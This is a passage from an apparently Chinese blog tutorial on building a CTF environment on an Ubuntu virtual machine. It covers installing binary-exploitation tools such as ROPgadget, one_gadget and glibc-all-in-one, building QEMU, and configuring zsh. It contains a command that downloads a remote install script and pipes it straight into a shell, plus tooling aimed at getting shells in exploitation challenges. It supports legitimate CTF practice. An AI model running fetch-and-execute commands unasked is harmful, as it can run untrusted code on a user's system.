https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>注意</strong>：<br>网上有很多通过 git 来安装的 <code>LibcSearcher</code> 在使用的时候会出现 “<code>libcsearcher No matched libc, please add more libc or try others</code>“ 的报错，通过 git 安装的那个版本可能不支持 python3，或者不是云端查找</p><p>我自己当初就是通过 git 安装，然后踩坑了，网上一大堆说删了 <code>Libcdatabase</code> 重新下载、通过 <code>./get</code> 更新的方法，但都行不通。。。</p></blockquote><hr><h2 id="安装-checksec"><a href="#安装-checksec" class="headerlink" title="安装 checksec"></a>安装 checksec</h2><blockquote><p>checksec 可用于识别二进制文件的安全属性，只是一个 sh 脚本，<mark>安装 pwntools 时自带，如果没有或者出现问题的话可以再手动安装</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/slimm609/checksec.sh.git /opt/checksec.sh<span class="token builtin class-name">cd</span> /opt/checksec.sh<span class="token comment"># 直接创建软链接即可使用,</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /opt/checksec.sh/checksec /usr/local/bin/checksec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：<em>创建软连接的指令中，两个路径都必须使用绝对路径</em>，否则会报如下错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">符号连接的层数过多: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果使用 checksec 过程中出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> not found: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可尝试使用上述方法通过 git 仓库创建软链接进行修复</p><p>当然还可以直接重装 pwntools，因为 checksec 一般是安装 pwntools 自带的，报错大概率与 pwntools 有关：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall pwntoolspip <span class="token function">install</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-ROPgadget"><a href="#安装-ROPgadget" class="headerlink" title="安装 ROPgadget"></a>安装 ROPgadget</h2><blockquote><p>用来找 gadget 的，<mark>安装 pwntools 时自带，如果没有或者出现问题的话可以再手动安装</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget<span class="token builtin class-name">cd</span> /opt/ROPgadget<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果使用 ROPgadget 过程中出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:  File <span class="token string">"/usr/local/bin/ROPgadget"</span>, line <span class="token number">4</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    __import__<span class="token punctuation">(</span><span class="token string">'pkg_resources'</span><span class="token punctuation">)</span>.run_script<span class="token punctuation">(</span><span class="token string">'ROPGadget==7.3'</span>, <span class="token string">'ROPgadget'</span><span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">720</span>, <span class="token keyword">in</span> run_script    self.require<span class="token punctuation">(</span>requires<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.run_script<span class="token punctuation">(</span>script_name, ns<span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">1546</span>, <span class="token keyword">in</span> run_script    raise ResolutionError<span class="token punctuation">(</span>pkg_resources.ResolutionError: Script <span class="token string">'scripts/ROPgadget'</span> not found <span class="token keyword">in</span> metadata at <span class="token string">'/home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论是 pwntools 自带的 ROPgadget 还是自己手动 git 安装的 ROPgadget，都将 ROPgadget 的 git 仓库下的 <code>scripts</code> 目录移动到<strong>报错的路径</strong>下即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果是 pwntools 自带的 ROPgadget, 首先需要将 ROPgadget 仓库 git 到本地</span><span class="token comment"># sudo git clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget</span><span class="token function">sudo</span> <span class="token function">cp</span> <span class="token parameter variable">-r</span> /opt/ROPgadget/scripts /home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>也可以尝试查看 ROPgadget 的版本，并卸载重装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> ROPgadgetpip uninstall ROPgadgetpip <span class="token function">install</span> <span class="token assign-left variable">ROPgadget</span><span class="token operator">==</span>版本号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重装 ROPgadget 后若因为旧版本而导致 pip 产生警告：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Skipping /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info due to invalid metadata entry <span class="token string">'name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除该文件即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-one-gadget"><a href="#安装-one-gadget" class="headerlink" title="安装 one_gadget"></a>安装 one_gadget</h2><blockquote><p>one_gadget 可以用来动态查找执行 libc 动态库中的 system 执行函数，可以一步到位<br>在做相关堆题时尤为有效，用来寻找 libc 库中的 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> ，一个 gadget 就可以 getshell，但需要注意 one_gadget 相关限制条件</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby<span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：one_gadget 需要安装 ruby （<strong>ruby &lt; 2.4 会导致 one_gadget 无法安装</strong>，最好是通过添加仓库的方式安装）</p><p>如果上述安装出现问题，可以通过添加仓库安装 ruby：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除旧版本 ruby</span><span class="token function">sudo</span> <span class="token function">apt</span> purge --auto-remove ruby<span class="token comment"># 添加仓库</span><span class="token function">sudo</span> add-apt-repository ppa:brightbox/ruby-ng<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token comment"># 指定 ruby 2.6 版本</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby2.6 ruby2.6-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-glibc-all-in-one"><a href="#安装-glibc-all-in-one" class="headerlink" title="安装 glibc-all-in-one"></a>安装 glibc-all-in-one</h2><blockquote><p>在做堆题时，经常遇到不同版本的 libc，这时 glibc-all-in-one 可以很好的派上用场，动态更改 elf 文件 libc 版本</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git /opt/glibc-all-in-one<span class="token builtin class-name">cd</span> /opt/glibc-all-in-one<span class="token function">sudo</span> ./update_list   <span class="token comment"># 获取可以更新的 glibc 的版本</span><span class="token function">cat</span> list   <span class="token comment"># 查看可下载的 glibc</span><span class="token function">sudo</span> ./download 需要的libc版本   <span class="token comment"># 例如：2.31-0ubuntu9_amd64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认下载到 glibc-all-in-one 的 <code>/libs</code> 目录下</p><hr><h2 id="安装-patchelf"><a href="#安装-patchelf" class="headerlink" title="安装 patchelf"></a>安装 patchelf</h2><blockquote><p>与 glibc-all-in-one 配合使用，可以用于更改 elf 文件 libc 版本</p></blockquote><ul><li>通过 apt 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>源码编译安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/NixOS/patchelf.git /opt/patchelf<span class="token builtin class-name">cd</span> /opt/patchelf<span class="token function">sudo</span> ./bootstrap.sh<span class="token function">sudo</span> ./configure<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> check<span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment"># 验证安装：</span>patchelf <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>sudo ./bootstrap.sh</code> 可能会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./bootstrap.sh: <span class="token number">2</span>: ./bootstrap.sh: autoreconf: not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装所需的包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-main-arena-offset"><a href="#安装-main-arena-offset" class="headerlink" title="安装 main_arena_offset"></a>安装 main_arena_offset</h2><blockquote><p>获取给定 libc 的 main_arena 偏移量</p><p>作者 <a href="https://github.com/zarkivy">zarkivy</a> 将其集成到了 pymao 库中：<a href="https://github.com/zarkivy/py_main_arena_offset">GitHub - zarkivy&#x2F;py_main_arena_offset: Get main_arena offset of a given libc with python</a> （依赖于 objdump，请确保你的 Linux 中已安装 binutils 包）</p></blockquote><ul><li>原版</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/bash-c/main_arena_offset /opt/main_arena_offset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/main_arena_offset./main_arena libc文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>pymao 集成版</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/IZAY01/py_main_arena_offset /opt/py_main_arena_offset<span class="token builtin class-name">cd</span> /opt/py_main_arena_offset<span class="token function">sudo</span> python3 setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pymao <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> <span class="token string">"./libc-2.27.so"</span>main_arena_offset <span class="token operator">=</span> gmao<span class="token punctuation">(</span>libc<span class="token punctuation">)</span><span class="token comment"># or main_arena_offset = get_main_arena_offset(libc)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-QEMU"><a href="#安装-QEMU" class="headerlink" title="安装 QEMU"></a>安装 QEMU</h2><blockquote><p>这是 arm 的 pwn 环境，QEMU 可以用来模拟各种架构的固件的运行，前期可以不安装，但是终究是逃不过的，建议一步到位</p><p>VMware 和 Virtualbox 之类通常只能在 x86 计算机上虚拟出一个 x86 虚拟机，而 QEMU 支持在 x86 上虚拟出一个 ARM 虚拟机</p><p>QEMU 源码下载地址：<a href="https://download.qemu.org/">Index of &#x2F; qemu</a><br>虚拟机磁盘镜像下载地址：<a href="https://people.debian.org/~aurel32/qemu/">Index of &#x2F;~aurel32&#x2F;qemu</a></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu qemu-kvm virt-manager bridge-utils binfmt-support<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span>  qemu-system qemu-user-static   <span class="token comment"># 安装系统态、用户态</span><span class="token comment"># 安装依赖库</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc-arm-linux-gnueabi<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 apt 方式安装的 QEMU 卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除包和相关依赖</span><span class="token function">sudo</span> <span class="token function">apt-get</span> remove --auto-remove qemu*<span class="token comment"># 删除配置文件和相关的数据文件</span><span class="token function">sudo</span> <span class="token function">apt-get</span> purge --auto-remove qemu*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：Ubuntu 24.04 中貌似去除了 <code>sudo apt install qemu</code>，但仍可以通过 <code>sudo apt install  qemu-system qemu-user-static</code> 安装，只是版本是 <code>qemu-8.2.2</code></p><p><strong>QEMU 有 user mode 和 system mode 两种配置方式</strong></p><p>其中 QEMU 在 system mode 配置下模拟出整个计算机，可以在 QEMU 之上运行一个操作系统；而 user mode 仅可用来运行对应架构的二进制文件，例如：交叉编译</p></blockquote><p>采用源码编译安装 <code>qemu-9.0.0</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://download.qemu.org/qemu-9.0.0.tar.xz<span class="token function">tar</span> xvJf qemu-9.0.0.tar.xz<span class="token builtin class-name">cd</span> qemu-9.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ninja-build zlib1g zlib1g-dev libglib2.0-dev libpixman-1-dev libfdt-dev python3-venv libgtk-3-dev build-essential pkg-config binutils-dev <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> flex bison<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编译安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> build <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> build<span class="token comment"># 以编译 x86_64 架构的 QEMU 为例，-softmmu 表示 system mode</span><span class="token function">sudo</span> <span class="token punctuation">..</span>/configure --enable-kvm --target-list<span class="token operator">=</span>x86_64-softmmu --enable-debug<span class="token comment"># 启动多核心编译加快速度</span><span class="token function">sudo</span> <span class="token function">make</span> -j<span class="token variable"><span class="token variable">$(</span>nproc<span class="token variable">)</span></span><span class="token comment"># 将其安装到 /bin 目录下，即可通过终端启动</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译完成后，会在 <code>build</code> 目录下生成 <code>x86_64</code> 架构下的 QEMU 本体：<code>qemu-system_x86-64</code></p><p>在终端验证安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system_x86-64 <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看 QEMU 安装路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">which</span> qemu-system-x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译命令中一些参数的说明：</p><table><thead><tr><th align="left">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>--enable-kvm</code></td><td align="left">表示开启 kvm 支持</td></tr><tr><td align="left"><code>--target-list</code></td><td align="left">指定要编译的 CPU 架构（<strong>如果不指定，就是全部架构都编译</strong>），其中 <code>-softmmu</code> 表示 system mode，<code>-linux-user</code> 表示 user mode</td></tr><tr><td align="left"><code>--enable-debug</code></td><td align="left">能够对 QEMU 进行调试</td></tr></tbody></table><blockquote><p>目前在 Ubuntu 24.04 中编译 <code>AARCH64</code> 架构的时候会报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2181</span>/9361<span class="token punctuation">]</span> Compiling C object libqemu-aarch64-linux-user.fa.p/target_arm_helper.c.oninja: build stopped: subcommand failed.  make: *** <span class="token punctuation">[</span>Makefile:167：run-ninja<span class="token punctuation">]</span> 错误 <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将报错文件 <code>../target/arm/cpu.c</code> 的第 1020 行的 <code>CS_ARCH_ARM64</code> 改为 <code>CS_ARCH_ARM</code>，重新编译即可</p></blockquote><p>QEMU 默认没有网络脚本文件，需要自己进行创建</p><p>在 <code>/usr/local/etc</code> 目录下（也有可能是 <code>/etc</code> 目录下，可以到时候根据报错路径来确定），新建 <code>qemu-ifup</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token builtin class-name">set</span> <span class="token parameter variable">-x</span><span class="token assign-left variable">switch</span><span class="token operator">=</span>br0<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token function">ip</span> tuntap <span class="token function">add</span> <span class="token variable">$1</span> mode tap user <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>    <span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> <span class="token variable">$1</span> up    <span class="token function">sleep</span> <span class="token number">0</span>.5s    <span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> <span class="token variable">$1</span> master <span class="token variable">$switch</span>    <span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token keyword">else</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Error: no interface specified"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>增加权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">755</span> /usr/local/etc/qemu-ifup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-Zsteg"><a href="#安装-Zsteg" class="headerlink" title="安装 Zsteg"></a>安装 Zsteg</h2><blockquote><p>做 MISC 需要，图像隐写神器</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-Basecrack"><a href="#安装-Basecrack" class="headerlink" title="安装 Basecrack"></a>安装 Basecrack</h2><blockquote><p>做 REVERSE、MISC 需要，Base 系列编码分析工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/mufeedvh/basecrack.git /opt/basecrack<span class="token builtin class-name">cd</span> /opt/basecrackpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython basecrack.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="GDB-配置"><a href="#GDB-配置" class="headerlink" title="GDB 配置"></a>GDB 配置</h1><blockquote><p><em>见 《<a href="GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A8.md">GDB的基础和使用</a>》一文，有非常详细的介绍</em></p></blockquote><hr><h1 id="配置-ZSH-终端"><a href="#配置-ZSH-终端" class="headerlink" title="配置 ZSH 终端"></a>配置 ZSH 终端</h1><blockquote><p>对比 Ubuntu 和 Kali 之后，觉得 Kali 的<mark>终端历史命令自动补全</mark>的功能真的是太好用了，还有<mark>命令输入正确和错误的高亮提示</mark>，简直不要太好用，原因就在于 Kali 2020 之后的版本默认终端为 zsh</p><p>Ubuntu 也可以安装 zsh 作为终端哦，不用再羡慕隔壁 Kali 啦，接下来用 zsh 打造一个究极好用的全新 Ubuntu 终端吧</p><p>参考文章：</p><ol><li><a href="https://blog.csdn.net/qq_51692609/article/details/121228694">Ubuntu版本安装zsh、配置ohmyzsh及插件、主题更换_ubuntu ohmyzsh-CSDN博客</a></li><li><a href="https://www.bktus.com/archives/2759">解决oh-my-zsh plugin ‘zsh-autosuggestions’ not found 与 plugin ‘zsh-syntax-highlighting’ not found问题 | BaKanTu union us (bktus.com)</a></li></ol><p><strong>注意：安装 <code>zsh</code> 后，以后所有要写入 <code>~/.bashrc</code> 的配置全都只需要写入 <code>~/.zshrc</code> 即可</strong></p></blockquote><p>安装 <code>zsh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zsh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>为了配置 <code>zsh</code>，还必须安装 <code>zsh</code> 的配置工具 <code>oh my zsh</code>，安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入 <code>y</code> 将默认 shell 更改为 <code>zsh</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Looking <span class="token keyword">for</span> an existing <span class="token function">zsh</span> config<span class="token punctuation">..</span>.Found /root/.zshrc. Backing up to /root/.zshrc.pre-oh-my-zshUsing the Oh My Zsh template <span class="token function">file</span> and adding it to /root/.zshrc.Time to change your default shell to zsh:Do you want to change your default shell to zsh? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA17.png" alt="Linux虚拟机CTF环境搭建17.png"></p><p>验证安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zsh</span> <span class="token parameter variable">--version</span><span class="token comment"># zsh 5.8.1 (x86_64-ubuntu-linux-gnu)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>添加原来 bash 的环境变量，将 <code>~/.zshrc</code> 的第二行取消注释：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA25.png" alt="Linux虚拟机CTF环境搭建25.png"></p><p>使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一些可能的问题：</p><ol><li>如果使用 <code>zsh</code> 过程中历史记录出现问题，报错如下：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: corrupt <span class="token function">history</span> <span class="token function">file</span> /home/wyy/.zsh_history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除原历史记录并重建：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ~/.zsh_history ~/.zsh_history_badstrings <span class="token parameter variable">-eS</span> ~/.zsh_history_bad <span class="token operator">></span> ~/.zsh_history <span class="token operator">&amp;&amp;</span> fc <span class="token parameter variable">-R</span> ~/.zsh_history<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.zsh_history_bad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启终端即可解决</p><ol start="2"><li>如果出现以下报错：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: no matches found: xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑 <code>~/.zshrc</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件最后加上一句：<code>setopt no_nomatch</code></p><p>使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="配置-zsh-autosuggestions"><a href="#配置-zsh-autosuggestions" class="headerlink" title="配置 zsh-autosuggestions"></a>配置 zsh-autosuggestions</h2><blockquote><p>这是一个历史命令智能提示插件，能帮助我们快速执行历史命令，实现终端历史命令自动补全</p></blockquote><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>plugins</code>，在 plugins 后面添加插件 <code>zsh-autosuggestions</code> （注意与原有的 git 空格隔开）</p><p>并加入插件 <code>zsh-autosuggestions</code> 的默认保存地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA19.png" alt="Linux虚拟机CTF环境搭建19.png"></p><p>保存退出后，更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">➜  ~ <span class="token builtin class-name">source</span> ~/.zshrc<span class="token punctuation">[</span>oh-my-zsh<span class="token punctuation">]</span> plugin <span class="token string">'zsh-autosuggestions'</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是因为前面并没有把插件的代码仓库克隆到本地位置上，所以插件其实并没有被安装</p><p>将插件克隆到本地：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>问题即可解决</p><p>安装 <code>zsh-autosuggestions</code> 前：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA18.png" alt="Linux虚拟机CTF环境搭建18.png"></p><p>安装 <code>zsh-autosuggestions</code> 后：</p><p><img 